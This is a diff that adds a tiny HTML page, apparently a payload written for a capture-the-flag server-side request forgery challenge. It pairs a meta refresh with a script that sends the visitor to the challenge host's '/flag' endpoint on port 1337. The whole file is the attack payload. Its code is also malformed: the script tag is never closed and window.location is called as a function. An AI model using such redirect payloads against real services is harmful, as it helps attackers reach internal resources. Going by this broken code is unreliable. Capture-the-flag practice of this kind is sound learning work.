@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="refresh" content="7; url='https://www.w3docs.com'" />
+  </head>
+  <body>
+    <p>cool</p>
+  </body>
+  
+  <script> window.location('http://ssrf.chall.seetf.sg:1337/flag')
+</html>
